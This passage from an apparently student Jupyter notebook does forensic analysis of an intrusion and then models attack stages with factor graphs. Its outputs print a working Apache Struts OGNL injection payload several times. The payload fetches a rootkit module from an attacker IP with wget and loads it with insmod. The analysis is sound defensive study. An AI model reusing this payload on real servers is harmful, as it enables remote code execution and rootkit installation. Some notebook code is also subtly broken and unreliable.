       "46  kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "\n",
       "    epoch  counter action                 decorations.host_uuid  \\\n",
       "42      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "43      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "44      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "45      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "46      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "   decorations.username            columns.name  ... columns.md5  \\\n",
       "42                  NaN                      rk  ...         NaN   \n",
       "43                  NaN          ipt_MASQUERADE  ...         NaN   \n",
       "44                  NaN  nf_nat_masquerade_ipv4  ...         NaN   \n",
       "45                  NaN    nf_conntrack_netlink  ...         NaN   \n",
       "46                  NaN               nfnetlink  ...         NaN   \n",
       "\n",
       "    columns.mode columns.mtime  columns.sha1  columns.sha256  columns.size  \\\n",
       "42           NaN           NaN           NaN             NaN           NaN   \n",
       "43           NaN           NaN           NaN             NaN           NaN   \n",
       "44           NaN           NaN           NaN             NaN           NaN   \n",
       "45           NaN           NaN           NaN             NaN           NaN   \n",
       "46           NaN           NaN           NaN             NaN           NaN   \n",
       "\n",
       "    columns.target_path columns.time  columns.transaction_id  columns.uid  \n",
       "42                  NaN          NaN                     NaN          NaN  \n",
       "43                  NaN          NaN                     NaN          NaN  \n",
       "44                  NaN          NaN                     NaN          NaN  \n",
       "45                  NaN          NaN                     NaN          NaN  \n",
       "46                  NaN          NaN                     NaN          NaN  \n",
       "\n",
       "[5 rows x 27 columns]"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslog_kernel.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['rk', 'ipt_MASQUERADE', 'nf_nat_masquerade_ipv4',\n",
       "       'nf_conntrack_netlink', 'nfnetlink', 'xfrm_user', 'xfrm_algo',\n",
       "       'iptable_nat', 'nf_conntrack_ipv4', 'nf_defrag_ipv4',\n",
       "       'nf_nat_ipv4', 'xt_addrtype', 'iptable_filter', 'ip_tables',\n",
       "       'xt_conntrack', 'x_tables', 'nf_nat', 'nf_conntrack',\n",
       "       'br_netfilter', 'bridge', 'stp', 'llc', 'overlay', 'ppdev',\n",
       "       'intel_powerclamp', 'crct10dif_pclmul', 'crc32_pclmul',\n",
       "       'ghash_clmulni_intel', 'aesni_intel', 'aes_x86_64', 'lrw',\n",
       "       'vboxvideo', 'gf128mul', 'glue_helper', 'ablk_helper', 'cryptd',\n",
       "       'ttm', 'drm_kms_helper', 'snd_intel8x0', 'snd_ac97_codec',\n",
       "       'ac97_bus', 'input_leds', 'joydev', 'serio_raw', 'snd_pcm', 'drm',\n",
       "       'fb_sys_fops', 'snd_timer', 'syscopyarea', 'sysfillrect',\n",
       "       'i2c_piix4', 'snd', 'sysimgblt', 'soundcore', 'vboxguest',\n",
       "       '8250_fintek', 'parport_pc', 'parport', 'mac_hid', 'autofs4',\n",
       "       'hid_generic', 'usbhid', 'hid', 'psmouse', 'ahci', 'libahci',\n",
       "       'e1000', 'pata_acpi', 'fjes', 'video', 'xt_nat', 'xt_tcpudp',\n",
       "       'veth', 'floppy', 'xor', 'raid6_pq', 'ufs', 'qnx4', 'hfsplus',\n",
       "       'hfs', 'minix', 'ntfs', 'msdos', 'jfs', 'xfs', 'libcrc32c',\n",
       "       'btrfs', 'nfnetlink_queue', 'nfnetlink_log', 'bluetooth'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslog_kernel[(oslog_kernel.action == 'added') | (oslog_kernel.action=='removed')]['columns.name'].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n"
     ]
    }
   ],
   "source": [
    "http_cmd = 0\n",
    "\n",
    "for pck in http:\n",
    "    try:\n",
    "        content_type = pck.http.Content_type\n",
    "        if 'wget' in content_type:\n",
    "            print(content_type)\n",
    "    \n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**From the content types we can find that rk.ko is downloaded through wget command.**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n"
     ]
    }
   ],
   "source": [
    "http_cmd = 0\n",
    "\n",
    "for pck in http:\n",
    "    try:\n",
    "        content_type = pck.http.Content_type\n",
    "        if 'insmod' in content_type:\n",
    "            print(content_type)\n",
    "    \n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**rk.ko is inserted into the kernel through insmod command.**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "paths = oslog['columns.target_path'].unique()\n",
    "file_hostname = []\n",
    "\n",
    "for path in paths:\n",
    "    if isinstance(path, float):\n",
    "        continue\n",
    "    if 'host' in path:\n",
    "        file_hostname.append(path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['\\\\/etc\\\\/dbus-1\\\\/system.d\\\\/org.freedesktop.hostname1.conf.dpkg-new',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swpx',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts~']"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "file_hostname"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**The file name that contains the internal hostnames is known_hosts. It is a file under path /root/.ssh**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "http_cmd = 0\n",
    "\n",
    "for pck in http:\n",
    "    try:\n",
    "        content_type = pck.http.Content_type\n",
    "        if 'known_hosts' in content_type:\n",
    "            print(content_type)\n",
    "    \n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**As there is no known_hosts appearing in the content type, there is no evidence that  that the attacker extracted the internal host names via HTTP in the logs.**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### DNS Traffic Analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n"
     ]
    }
   ],
   "source": [
    "http_cmd = 0\n",
    "\n",
    "for pck in http:\n",
    "    try:\n",
    "        content_type = pck.http.Content_type\n",
    "        if 'wget' in content_type:\n",
    "            print(content_type)\n",
    "    \n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "df_dns = pd.read_csv('dns_df.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "df_dns_query = df_dns[df_dns['port'] == 53]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['162.212.156.148', '75.75.75.75'], dtype=object)"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_dns_query['ip_src'].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**There are two DNS servers, 162.212.156.148 and 75.75.75.75. 162.212.156.148 is the attacker-controlled one because it stores the wget .ko file.**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [],
   "source": [
    "controlled = df_dns[df_dns['ip_dst'] == '162.212.156.148'].length\n",
    "legitimate = df_dns[df_dns['ip_dst'] == '75.75.75.75'].length"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 720x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.figure(figsize=(10, 8))\n",
    "bins = np.linspace(80, 1200, 20)\n",
    "\n",
    "plt.hist(controlled, bins, alpha=0.5, label='controlled')\n",
    "plt.hist(legitimate, bins, alpha=0.5, label='legitimate')\n",
    "plt.legend(loc='upper right')\n",
    "plt.title('Distribution of the length of DNS queries to the two DNS servers')\n",
    "plt.ylabel('Frequency')\n",
    "plt.xlabel('DNS query length')\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "import pandas as pd\n",
    "from pgmpy.factors.discrete import DiscreteFactor\n",
    "from pgmpy.models import FactorGraph\n",
    "from pgmpy.inference import BeliefPropagation\n",
    "import networkx as nx\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Task 2 "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ge\\Anaconda3\\lib\\site-packages\\networkx\\drawing\\nx_pylab.py:579: MatplotlibDeprecationWarning: \n",
      "The iterable function was deprecated in Matplotlib 3.1 and will be removed in 3.3. Use np.iterable instead.\n",
      "  if not cb.iterable(width):\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "G = FactorGraph() ## Create FactorGraph object\n",
    "###############################\n",
    "#   TODO: Define factor functions\n",
    "###############################\n",
    "f_1 = DiscreteFactor(['S1'], [2],  values=[0.85,0.15])\n",
    "f_2 = DiscreteFactor(['S1','E1'], [2,2], values=[0.1,0.2,0,0.5])\n",
    "\n",
    "###############################\n",
    "#   TODO: Add random variables\n",
    "#         and factor functions \n",
    "###############################\n",
    "G.add_nodes_from(['S1','E1'])  ## Add random variables \n",
    "G.add_factors(f_1,f_2)     ## Add factor functions\n",
    "\n",
    "###############################\n",
    "#   TODO: Add the edges for random \n",
    "#   variables and factor functions\n",
    "###############################\n",
    "G.add_edges_from([('S1', f_1),('S1', f_2),('E1', f_2)])\n",
    "G.check_model()\n",
    "nx.draw(G,with_labels =True)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E1: 100%|██████████████████████████| 1/1 [00:00<00:00, 250.14it/s]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-------+-----------+\n",
      "| S1    |   phi(S1) |\n",
      "+=======+===========+\n",
      "| S1(0) |    0.7727 |\n",
      "+-------+-----------+\n",
      "| S1(1) |    0.2273 |\n",
      "+-------+-----------+\n"
     ]
    }
   ],
   "source": [
    "from pgmpy.factors.discrete import JointProbabilityDistribution\n",
    "bp = BeliefPropagation(G)\n",
    "###############################\n",
    "#   TODO: Compute the marginal probability\n",
    "###############################\n",
    "margin = bp.query(joint=False,variables=['S1'])\n",
    "print(margin['S1'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "0it [00:00, ?it/s]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-------+-----------+\n",
      "| S1    |   phi(S1) |\n",
      "+=======+===========+\n",
      "| S1(0) |    0.6939 |\n",
      "+-------+-----------+\n",
      "| S1(1) |    0.3061 |\n",
      "+-------+-----------+\n"
     ]
    }
   ],
   "source": [
    "newmargin = bp.query(joint=False,variables=['S1'],evidence={'E1': 1})\n",
    "print(newmargin['S1'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "S1=0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Task 3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "ATTACK_EVENTS_MAP = {\n",
    "    'Scan':1,\n",
    "    'Login':2,\n",
    "    'Sensitive_URI':3,\n",
    "    'New_Kernel_Module':4,\n",
    "    'DNS_Tunneling':5\n",
    "}\n",
    "ATTACK_STATES_MAP = {\n",
    "    'benign': 1,\n",
    "    'discovery': 2,\n",
    "    'access': 3,\n",
    "    'lateral_movement': 4,\n",
    "    'privilege_escalation': 5,\n",
    "    'persistence': 6,\n",
    "    'defense_evasion': 7,\n",
    "    'collection': 8,\n",
    "    'exfiltration': 9,\n",
    "    'command_control': 10,\n",
    "    'execution': 11\n",
    "}\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.0 "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Event</th>\n",
       "      <th>State</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>0</td>\n",
       "      <td>Sensitive_URI</td>\n",
       "      <td>benign</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>1</td>\n",
       "      <td>Sensitive_URI</td>\n",
       "      <td>benign</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>2</td>\n",
       "      <td>Scan</td>\n",
       "      <td>benign</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>3</td>\n",
       "      <td>Scan</td>\n",
       "      <td>benign</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>4</td>\n",
       "      <td>Scan</td>\n",
       "      <td>benign</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>1195</td>\n",
       "      <td>New_Kernel_Module</td>\n",
       "      <td>benign</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>1196</td>\n",
       "      <td>Scan</td>\n",
       "      <td>benign</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>1197</td>\n",
       "      <td>Login</td>\n",
       "      <td>benign</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>1198</td>\n",
       "      <td>Scan</td>\n",
       "      <td>benign</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>1199</td>\n",
       "      <td>Scan</td>\n",
       "      <td>benign</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>1200 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                   Event   State\n",
       "0         Sensitive_URI   benign\n",
       "1         Sensitive_URI   benign\n",
       "2                  Scan   benign\n",
       "3                  Scan   benign\n",
       "4                  Scan   benign\n",
       "...                  ...     ...\n",
       "1195  New_Kernel_Module   benign\n",
       "1196               Scan   benign\n",
       "1197              Login   benign\n",
       "1198               Scan   benign\n",
       "1199               Scan   benign\n",
       "\n",
       "[1200 rows x 2 columns]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "event_review = open('event_review.txt', 'r') \n",
    "Lines = event_review.readlines() \n",
    "event=[]\n",
    "latent=[]\n",
    "for line in Lines: \n",
    "    a=(line.split('//'))[0]\n",
    "    del1=\"[Event]\"\n",
    "    a=a[7:]\n",
    "    event.append(a)\n",
    "    b=(line.split('//'))[1]\n",
    "    del2=\"/[Latent Attack State]\\n\"\n",
    "    b=b[21:-1]\n",
    "    b=b.replace(']','')\n",
    "    latent.append(b)\n",
    "d = {'Event':event,'State':latent}\n",
    "df = pd.DataFrame(d)\n",
    "df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Event               State               \n",
       "DNS_Tunneling       exfiltration            0.980000\n",
       "                    benign                  0.020000\n",
       "Login               benign                  1.000000\n",
       "New_Kernel_Module   benign                  0.875000\n",
       "                    persistence             0.125000\n",
       "Scan                benign                  0.936000\n",
       "                    discovery               0.064000\n",
       "Sensitive_URI       benign                  0.553333\n",
       "                    privilege_escalation    0.446667\n",
       "Name: State, dtype: float64"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.groupby('Event')['State'].value_counts() / df.groupby('Event')['State'].count()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Therefore the corresbonding vector for each events are:\n",
    "\n",
    "f1,f2,E1(scan): [0.936,0.064,0,0,0,0,0,0,0,0,0]\n",
    "\n",
    "\n",
    "f3,E2(Login):[1,0,0,0,0,0,0,0,0,0,0]\n",
    "\n",
    "f4,f5,E3(Sensitive_URI):[0.553333,0,0,0,0.446667,0,0,0,0,0,0]\n",
    "\n",
    "f6,f7E4(New Kernel Module):[0.875,0,0,0,0,0.125,0,0,0,0,0]\n",
    "\n",
    "f8,f9,E5(DNS_Tunneling):[0.02,0,0,0,0,0,0,0,0.98,0,0]\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "('Scan', 'Sensitive_URI', 'New_Kernel_Module')\n",
      "0.07147962830593281\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Count</th>\n",
       "      <th>Sequence</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>0</td>\n",
       "      <td>0.071480</td>\n",
       "      <td>(Scan, Sensitive_URI, New_Kernel_Module)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>1</td>\n",
       "      <td>0.005361</td>\n",
       "      <td>(Login, Scan, Login)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>2</td>\n",
       "      <td>0.009650</td>\n",
       "      <td>(Scan, Login, Scan)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>3</td>\n",
       "      <td>0.007863</td>\n",
       "      <td>(Login, Scan, DNS_Tunneling)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>4</td>\n",
       "      <td>0.007148</td>\n",
       "      <td>(Scan, DNS_Tunneling, Scan)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>120</td>\n",
       "      <td>0.003931</td>\n",
       "      <td>(DNS_Tunneling, Scan, Scan)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>121</td>\n",
       "      <td>0.003931</td>\n",
       "      <td>(Scan, Scan, New_Kernel_Module)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>122</td>\n",
       "      <td>0.005004</td>\n",
       "      <td>(DNS_Tunneling, Login, DNS_Tunneling)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>123</td>\n",
       "      <td>0.003931</td>\n",
       "      <td>(DNS_Tunneling, New_Kernel_Module, New_Kernel_...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>124</td>\n",
       "      <td>0.002859</td>\n",
       "      <td>(Login, New_Kernel_Module, New_Kernel_Module)</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>125 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "        Count                                           Sequence\n",
       "0    0.071480           (Scan, Sensitive_URI, New_Kernel_Module)\n",
       "1    0.005361                               (Login, Scan, Login)\n",
       "2    0.009650                                (Scan, Login, Scan)\n",
       "3    0.007863                       (Login, Scan, DNS_Tunneling)\n",
       "4    0.007148                        (Scan, DNS_Tunneling, Scan)\n",
       "..        ...                                                ...\n",
       "120  0.003931                        (DNS_Tunneling, Scan, Scan)\n",
       "121  0.003931                    (Scan, Scan, New_Kernel_Module)\n",
       "122  0.005004              (DNS_Tunneling, Login, DNS_Tunneling)\n",
       "123  0.003931  (DNS_Tunneling, New_Kernel_Module, New_Kernel_...\n",
       "124  0.002859      (Login, New_Kernel_Module, New_Kernel_Module)\n",
       "\n",
       "[125 rows x 2 columns]"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import more_itertools\n",
    "\n",
    "def window(seq, n=2):\n",
    "    \"Returns a sliding window (of width n) over data from the iterable\"\n",
    "    \"   s -> (s0,s1,...s[n-1]), (s1,s2,...,sn), ...                   \"\n",
    "    it = iter(seq)\n",
    "    result = tuple(islice(it, n))\n",
    "    if len(result) == n:\n",
    "        yield result\n",
    "    for elem in it:\n",
    "        result = result[1:] + (elem,)\n",
    "        yield result\n",
    "        \n",
    "attack_sequences = open('attack_sequences.txt', 'r') \n",
    "\n",
    "Lines = attack_sequences.readlines() \n",
    "\n",
    "newlist=[]\n",
    "\n",
    "for line in Lines: \n",
    "    a=line.split()\n",
    "    newlist.extend(list(more_itertools.windowed(a,n=3, step=1)))\n",
    "      \n",
    "def unique(list1): \n",
    "    # intilize a null list \n",
    "    unique_list = []    \n",
    "    # traverse for all elements \n",
    "    for x in list1: \n",
    "        # check if exists in unique_list or not \n",
    "        if x not in unique_list: \n",
    "            unique_list.append(x) \n",
    "    return unique_list \n",
    "    \n",
    "ulist=unique(newlist)\n",
    "\n",
    "def countX(lst, x): \n",
    "    return lst.count(x) \n",
